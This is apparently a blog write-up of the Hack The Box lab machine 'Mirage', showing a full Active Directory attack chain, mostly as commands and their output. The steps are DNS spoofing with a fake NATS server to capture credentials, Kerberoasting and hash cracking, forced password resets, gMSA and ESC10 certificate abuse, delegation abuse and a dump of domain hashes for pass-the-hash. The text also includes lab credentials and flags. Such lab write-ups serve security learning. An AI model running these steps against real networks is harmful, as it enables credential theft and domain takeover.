---
title: Mirage HackTheBox Writeup
date: 2025-07-26 00:00:00 +0000
categories: [Writeup, HTB]
tags: [active-directory, adcs-attack, dns-poisining]     # TAG names should always be lowercase
toc: false
# image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5c9c46ad001394e992f1c7b830ee77e5.png
---

In this writeup, I’ll guide you through my approach to the Mirage machine on Hack The Box — a Windows-based Active Directory challenge that starts with no credentials.

The objective? Work our way up from an unauthenticated position to full Domain Admin privileges.


## Enumeration

```bash
nmap -T4 -p- -A 10.10.11.78 --min-rate=10000 

PORT      STATE SERVICE         VERSION
53/tcp    open  domain          Simple DNS Plus

88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-07-20 21:00:05Z)

111/tcp   open  rpcbind         2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status

135/tcp   open  msrpc           Microsoft Windows RPC

139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn

389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr        1-4 (RPC #100021)
3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
4222/tcp  open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY","server_name":"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":536,"client_ip":"10.10.14.72","xkey":"XB2NV6U7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY","server_name":"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":537,"client_ip":"10.10.14.72","xkey":"XB2NV6U7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY","server_name":"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":539,"client_ip":"10.10.14.72","xkey":"XB2NV6U7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY","server_name":"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":535,"client_ip":"10.10.14.72","xkey":"XB2NV6U7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX"} 
|_    -ERR 'Authentication Timeout'
9389/tcp  open  mc-nmf          .NET Message Framing
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

<div style="background-color: #2b2b2b; color: #f1f1f1; border: 1px solid #444; padding: 20px; border-radius: 5px; margin-bottom: 25px;">
  <strong>⚠️ Heads-Up:</strong><br><br>
  This challenge is currently active on 
  <a href="https://hackthebox.com" style="color: #ff66cc;" target="_blank"><u>HackTheBox</u></a>.<br><br>
  Per HTB’s content rules, this writeup will only be published publicly once the challenge is retired.<br><br>
  If you're stuck or want to chat, feel free to reach out via
  <a href="https://x.com/0xDekuSec" target="_blank" style="color: #ff66cc;"><u>Twitter</u></a>.
  <a href="https://www.linkedin.com/in/sairaj-barve-85713b264/" target="_blank" style="color: #ff66cc;"><u>Linkedin</u></a>.
</div>


<div style="background-color: #1c1c1c; border: 1px solid #333; padding: 20px; border-radius: 5px; margin-bottom: 10px;">
  <label for="pw-input" style="color: #f8f9fa;"><strong>🔒 Enter password to unlock full content:</strong></label><br><br>
  <input type="password" id="pw-input" placeholder="Enter password"
         style="padding: 10px; width: 250px; background-color: #2c2c2c; color: #fff; border: 1px solid #444; border-radius: 3px;" />
  <button id="unlock-btn" onclick="checkPassword()" style="padding: 10px 20px; margin-left: 10px; background-color: #444; color: white; border: none; border-radius: 3px; cursor: pointer; transition: transform 0.1s ease;">
    Unlock
  </button>
  <p id="pw-message" style="color: red; margin-top: 10px;"></p>
</div>

<div id="secret-content" style="display: none; background-color: #252525; color: #eee; padding: 20px; border-radius: 5px; border: 1px dashed #666;">
  <p><strong></strong><br>Keep Learning, Keep Growing!</p>
</div>

<script>
  function checkPassword() {
    const password = document.getElementById("pw-input").value;
    const message = document.getElementById("pw-message");
    const unlock = document.getElementById("unlock-btn");

    unlock.style.transform = "scale(0.95)";
      setTimeout(() => {
        unlock.style.transform = "scale(1)";
      }, 100);

    if (password === "pgjeu") {
      message.style.color = "limegreen";
      message.innerHTML = "Good job, God Bless You!";
      showContent();
    } else {
      message.style.color = "red";
      message.innerHTML = "Incorrect password.";
    }
  }

  function showContent() {
    const content = document.getElementById("secret-content");
    content.style.display = "block";
  }
</script>



{% comment %}

### Enumerating NFS (Port 2049)

The Nmap scan revealed that **port 2049** was open, which usually indicates that **NFS (Network File System)** is running. With that in mind, I started enumerating the available NFS shares:

```bash
showmount -e 10.10.11.78

Export list for 10.10.11.78:
/MirageReports (everyone)
```

The `/MirageReports` directory was publicly accessible. I mounted it locally using:

```bash
sudo mount -t nfs 10.10.11.78:/MirageReports /mnt/
```

Listing the contents of the mounted directory:

```bash
[/mnt]
└─$ ls
Incident_Report_Missing_DNS_Record_nats-svc.pdf
Mirage_Authentication_Hardening_Report.pdf
```

These documents seemed promising and could contain useful intel for further enumeration or exploitation.

### Exploiting NATS on Port 4222 via DNS Spoofing

**NATS** is a lightweight messaging system. From the file `Incident_Report_Missing_DNS_Record_nats-svc.pdf`, The hostname `nats-svc.mirage.htb` was missing its **A record**, meaning it didn’t resolve to any IP address. This misconfiguration made it possible to spoof the DNS entry and redirect traffic to my own machine, enabling me to intercept credentials via a fake NATS server.

To intercept NATS cerdentials, I crafted a facke NATS server using Python:

```python
# nats_intercepter.py
import socket

print("[+] Fake NATS Server listening on 0.0.0.0:4222")
s = socket.socket()
s.bind(("0.0.0.0", 4222))
s.listen(5)

while True:
    client, addr = s.accept()
    print(f"[+] Connection from {addr}")
    client.sendall(b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n')
    data = client.recv(1024)
    print("[>] Received:")
    print(data.decode())
    client.close()
```

Once the server was ready I spoofed the dns entry using `nsupdate` to redirect traffic from `nats-svc.mirage.htb` to my machine:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 3600 A 10.10.14.72
> send
```

Soon after, a connection came through from the target system and it leaked valid credentials directly in the NATS handshake:

```bash
python3 nats_intercepter.py
[+] Connection from ('10.10.11.78', 60493)
[>] Received:
CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!", ...}
```

Captured Credentials:

Username: `Dev_Account_A`

Password: `hx5h7F5554fP@1337!`

### Validating NATS Credentials & Sniffing Message Streams

After capturing the NATS credentials, I wanted to verify if they actually worked with the real NATS service running on the target.

I used `nats-cli` tool to subscribe and publish to a test subject

```bash
~/go/bin/nats --server=10.10.11.78 --user=Dev_Account_A --password='hx5h7F5554fP@1337!' sub test
# Subscribing on test
```

```bash
~/go/bin/nats --server=10.10.11.78 --user=Dev_Account_A --password='hx5h7F5554fP@1337!' pub test "Hello"
# Published 5 bytes to "test"
```

This confirmed the credentials were valid and active.

Starting of with the sniffing stuff, To look for live communication happening across all subjects, I used a wildcard subscription:

```bash
nats sub ">" --server=10.10.11.78 --user=Dev_Account_A --password='hx5h7F5554fP@1337!'
```

This revealed internal messages, including JetStream metadata:

```bash
$JS.API.STREAM.INFO.auth_logs
...
logs.auth
...
```

I discovered a stream called `auth_logs` on the subject `logs.auth`, which seemed to contain authentication-related data.

I queried the stream to learn more:

```bash
~/go/bin/nats stream info auth_logs --server=10.10.11.78 --user=Dev_Account_A --password='hx5h7F5554fP@1337!'

Output:

Information for Stream auth_logs created 2025-05-05 12:48:19

                Subjects: logs.auth
                Replicas: 1
                 Storage: File

Options:

               Retention: Limits
         Acknowledgments: true
          Discard Policy: New
        Duplicate Window: 2m0s
              Direct Get: true
    Allows Batch Publish: false
         Allows Counters: false
       Allows Msg Delete: false
  Allows Per-Message TTL: false
            Allows Purge: false
          Allows Rollups: false

Limits:

        Maximum Messages: 100
     Maximum Per Subject: unlimited
           Maximum Bytes: 1.0 MiB
             Maximum Age: unlimited
    Maximum Message Size: unlimited
       Maximum Consumers: unlimited

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
                Messages: 5
                   Bytes: 570 B
          First Sequence: 1 @ 2025-05-05 12:48:56
           Last Sequence: 5 @ 2025-05-05 12:49:27
        Active Consumers: 0
      Number of Subjects: 1
```

Key details:

* Stream: `auth_logs`
    
* Subject: `logs.auth`
    
* Message: `5`
    
* Sequence Range: `1 → 5`
    

Extracting credentials from stream, I then pulled the first mesaage in the stream using:

PS: All the 5 message contained same message!

```bash
~/go/bin/nats stream get auth_logs 1 --server=10.10.11.78 --user=Dev_Account_A --password='hx5h7F5554fP@1337!'

Output:

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
```

**Extracted credentials:**

* Username: `david.jjackson`
    
* Password: `pN8kQmn6b86!1234@`
    

As the network only allows kerberos authentication, generated a TGT ticket:

```bash
impacket-getTGT -dc-ip 10.10.11.78 mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'

[*] Saving ticket in david.jjackson.ccache
```

Exported the ticket, now we can authenticate using `-k` in any tool which supports kerberos authentication:

```bash
export KRB5CCNAME=david.jjackson.ccache
```

### Kerberoasting via Valid Domain Credentials

Using `david.jjackson` credentials, we confirmed domain access using:

```bash
KRB5CCNAME=david.jjackson.ccache nxc ldap dc01.mirage.htb -d mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k

LDAP    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

After verifying our credentials on the domain, Proceeded to enumerate SPNs for potential Kerberoasting:

```bash
KRB5CCNAME=david.jjackson.ccache impacket-GetUserSPNs mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -dc-ip 10.10.11.78 -request -k -no-pass -dc-host dc01.mirage.htb

$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$63b35fb1823452956b165376af751477$b539f8d269b9bf7908a3d25f0422461da7d5ff01e49833f66e150d7b9ab7102c8e1103912c040471cf83fe5c5024b2a3d3a621bd8e6f6cf31084505a386be5263c65273d3f53bc394a82107002fb82277f54bf3e54b67d05a82ba496bcdea66bc148725313e6f9fade55ab3ef14f6d9413d428cc2e383d439216d5aeb1fc92ccc0cde5276a9c115984250d329dc73f42f407a578bc8e513cfa65cce5505864bca07e5f510ac164abba836c42f912e4363fbee68df29ab36e4eff0857715be7856699bf6a685d77997c274ba961e8afe4d40b05b9806abe27b41d399abdec1007ef9cdf5ca3b59315c504eed4bb8fb1d584c23840adf1a0567afe44b56f468688af851c1597ccfce1bd6bc6d946c4b828e387b053eebfc4a7874cf1515884c6e04732f1335f41ec7d64e2cd9ebd63d83133bad6f2993ef2a056914e2665f6f28c92ce9e4536f97706708b27bb81b14454a10e3768ebe71ce13bbcd914677836ddb7d2ab51cc9cf6cc2b598b74ee181c0545d25ebdcaaefbe3d395e0d13f4d2401697ec32f90d50221c1d140791615b271de92d8548c2fdbacd2aa49fcb8960190c64a4869c4f4dfa93b158259511af19701c2dcd1944821b7dfeb18627ed971b1983d5aea3643840ce728c1d42f42d7c3119707d422e48bab05b164453b46d6d19b1db0cdfc7e91a0dd023e635a06e8acdc04f669f574c17c8bc7d22602022134be04788feec9045e0c10caf19aa669801cc05ce01253ffe6a09df98847d156ba4cd10d9b6b5f9015829fcdee58ed8e56a7e38387177e7fcbe87af99819bea2393ffd29a2059b4f54ceac19fe39fc6f58d28be937ba822da4548ef13c56faf5dec7d9d263a0ba44a401614bdfdafd513325450389ab59b8026e73fee0e989f4f2ed9a5165e7a7c619f65e96668754e4cc464ac64d58889565dffd35da2feca298c6d797679bc286549bd8fd79dfca5e88c6a647cca47ef4cb1d64ff636f29581ceb205ca3bbe6b824dad8d363d6ab01b02d555cc7abe7bd64eb3c5af5e81a9f95a3add04f55a0a26a3c5d8ede9cd0087e2563969a3a3ca2289fbf1f3353634bc573f48348e0c2687115499f391253ddb0d73460c4ea66a195cc7c2181845db6126962e4ffca8ce3dcfef36fd7cac606de9efb8259dac3997a069b348ec2cfa50d795726337be1c80b9f219961b5211d3d08992025f1c3b6abfc9b2b4fdb37958cb685801559d024a728403f608b86f23da5ac980d2eca4d16fb70a10e7b1a5506905875d1a2c4a17dbf8da4d16cd75128a258d55f8947d69dfa3d017e56bc9ea7e3d5ba78f3965bd313232ec65c39cc0a12cab133e2914efdc3174c144eaf9c279ce46c0e25a1e725088e059e7973a8f045967b2c7a5df9e08ca3e4639d94a5490c4c4a753d5dbc6c4e6a57eded63bdd5bea0fdff2fabaa2e05e2f816985d6034546d59f54c9bf78daacd1036a802661cb7e979dd34bba7a7615805d4560d51a1ec19c15d1e80d104dfc92ce7f1f664e8844e8a46226e42a1989ddca891faf4891908ecc0ef5eedeb4100d72595cac2abcbaff52c176b4c2ed7
```

Discovered an SPN for `nathan.aadam`, indicating a service account. I extracted the TGS hash and cracked it offline:

```bash
hashcat -m 13100 nathan.aadam_tgs.hash /usr/share/wordlists/rockyou.txt

<TGS_HASH>:3edc#EDC3
```

Discovered Credentials:

* Username: `nathan.aadam`
    
* Password: `3edc#EDC3`
    

```bash
impacket-getTGT -dc-ip 10.10.11.78 mirage.htb/nathan.aadam:'3edc#EDC3'

[*] Saving ticket in nathan.aadam.ccache
```

With the ticket saved, we authenticated using Evil-WinRM and successfully captured the user flag:

```bash
KRB5CCNAME=nathan.aadam.ccache evil-winrm -i dc01.mirage.htb -r MIRAGE.HTB

*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> cat user.txt
fd221e3e5b59b4287f01100b547456fd
```

### Lateral Movement via winPEAS

```bash
*Evil-WinRM* PS C:\Users\nathan.aadam> ./winPEASx64.exe
```

In the output, we discovered hardcoded credentials for another user:

![Mark logged in into nathan!](https://cdn.hashnode.com/res/hashnode/image/upload/v1753424564895/faca6f54-7b9b-4c64-bc69-0f652ccf8bd0.png)

Discovered Credentials:

* Username: `mark.bbond`
    
* Password: `1day@atime`

Forced Password Reset ≠ Instant Access

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753426728059/f6c55dfb-5d39-4791-a499-1b0a9aea717a.png)

```bash
impacket-getTGT -dc-ip 10.10.11.78 mirage.htb/mark.bbond:'1day@atime'

[*] Saving ticket in mark.bbond.ccache
```

We found **mark.bbond** had `ForceChangePassword` rights over **javier.mmarshall**, so we reset his password:

```bash
KRB5CCNAME=mark.bbond.ccache bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u mark.bbond -p '1day@atime'  set password javier.mmarshall 'Password1!'

[+] Password changed successfully!

# javier.mmarshall:Password1!
```

But initial login failed:

```bash
nxc ldap dc01.mirage.htb -d mirage.htb -u javier.mmarshall -p 'Password1!' -k

KDC_ERR_CLIENT_REVOKED
```

Why? The account was:

* *Disabled*
    
* *Logon hours = 0* (no login allowed)
    

We fixed that using:

```bash
# Enables the user account 'javier.mmarshall'
Set-ADUser -Identity "javier.mmarshall" -Enabled $true

# Creates an array of 21 bytes, each set to 255 (binary 11111111), allowing login for all 24 hours, all 7 days
$logonHours = [byte[]](0..20 | ForEach-Object {255})

# Updates the 'LogonHours' attribute of the user to allow login 24/7
Set-ADUser -Identity javier.mmarshall -Replace @{LogonHours = $logonHours}
```

Retried Login:

```bash
nxc ldap dc01.mirage.htb -d mirage.htb -u javier.mmarshall -p 'Password1!' -k

[+] mirage.htb\javier.mmarshall:Password1!

# It worked!
```

### ReadGMSAPassword Privilege Abuse

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753427040796/cf5bd835-8271-4b58-9734-b0e7a3150886.png)

```bash
KRB5CCNAME=javier.mmarshall.ccache nxc ldap dc01.mirage.htb -d mirage.htb -u javier.mmarshall -p 'Password1!' -k --gmsa

# ccount: Mirage-Service$      
# NTLM: 305806d84f7c1be93a07aaf40f0c7866     
# PrincipalsAllowedToReadPassword: javier.mmarshall
```

```bash
impacket-getTGT -dc-ip 10.10.11.78 mirage.htb/Mirage-Service$ -hashes :305806d84f7c1be93a07aaf40f0c7866 -k

[*] Saving ticket in Mirage-Service$.ccache
```

Checking Writable Objects with `Mirage-SERVICE$`

```bash
KRB5CCNAME=Mirage-Service$.ccache bloodyAD -k -d mirage.htb --dc-ip 10.10.11.78 --host dc01.mirage.htb get writable

distinguishedName: CN=TPM Devices,DC=mirage,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mirage,DC=htb
permission: WRITE

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
permission: WRITE

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
permission: WRITE
```

### Privilege Escalation: ESC10 (Case 2)

After attempting to enumerate vulnerable certificate templates using `certipy-ad` and not finding anything exploitable, ESC1, ESC2, and ESC3 were ruled out. However, through manual inspection, **ESC10 Case 2** was identified and all its requirements were met.

### Conditions Satisfied:

* `CertificateMappingMethods` is set to `0x4`, meaning **no strong mapping** is enforced, only the UPN is validated.
    
    ```powershell
    whoami
    mirage\mark.bbond
    
    reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\"
    
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
        EventLogging                   REG_DWORD    0x1
        CertificateMappingMethods      REG_DWORD    0x4
    ```
    
* A certificate template (e.g. built-in **User** template) allows **Client Authentication**.
    
* We have **GenericWrite** access on a user (`mark.bbond`) and can set a UPN of an account without one (e.g. `dc01$`).
    

### Attack Steps:

Set the UPN of `mark.bbond` to impersonate `dc01$`

```bash
KRB5CCNAME=Mirage-Service$.ccache bloodyAD --host dc01.mirage.htb -d mirage.htb -k set object 'mark.bbond' userPrincipalName -v 'dc01$@mirage.htb'

[+] mark.bbond's userPrincipalName has been updated
```

Request a certificate for `dc01$` using the `User` template

```bash
KRB5CCNAME=Mirage-Service$.ccache certipy-ad req -k -dc-ip 10.10.11.78 -target dc01.mirage.htb -ca 'mirage-DC01-CA' -template 'User'

[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Saved certificate and private key to 'dc01.pfx'
```

Restore the original UPN for `mark.bbond`

```bash
KRB5CCNAME=Mirage-Service$.ccache certipy-ad account update -k -dc-ip 10.10.11.78 -target dc01.mirage.htb -user mark.bbond -upn 'mark.bbond@mirage.htb'

[*] Successfully updated 'mark.bbond'
```

After obtaining a certificate for `dc01$`, we used it to authenticate and set **Resource-Based Constrained Delegation (RBCD)** rights for the `MIRAGE-SERVICE$` GMSA.

```bash
certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell

# Set RBCD rights on DC01$ for MIRAGE-SERVICE$
set_rbcd 'DC01$' MIRAGE-SERVICE$

# Output:
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
MIRAGE-SERVICE$ can now impersonate users on DC01$ via S4U2Proxy
```

### Impersonate DC01$ and Dump Domain Hashes

Now using the hash of `MIRAGE-SERVICE$`, we impersonated `DC01$`:

```bash
KRB5CCNAME=Mirage-Service$.ccache impacket-getST -spn 'cifs/dc01.mirage.htb' -impersonate 'DC01$' -dc-ip 10.10.11.78 \
-k 'mirage.htb/MIRAGE-SERVICE$' -hashes :305806d84f7c1be93a07aaf40f0c7866

[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
```

Then dumped the NTLM hashes directly from the domain controller:

```bash
KRB5CCNAME=DC01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache impacket-secretsdump -just-dc-ntlm \
-k -no-pass -dc-ip 10.10.11.78 dc01.mirage.htb

[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:dbac2122c1f3a94559ab8c40293f5f3b:::
```

### Final Step: Admin Access via Kerberos

Using the dumped Administrator hash, we requested a TGT:

```bash
impacket-getTGT -dc-ip 10.10.11.78 mirage.htb/administrator \
-hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 -k

[*] Saving ticket in administrator.ccache
```

```bash
KRB5CCNAME=administrator.ccache evil-winrm -i dc01.mirage.htb -r MIRAGE.HTB

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
7530c01ef5ecbdc197969d88366729f5
```

{% endcomment %}

![Pwned Mirage](https://cdn.hashnode.com/res/hashnode/image/upload/v1753430855823/c5ec1c0b-5816-4cb4-a616-dc16a575711d.png)


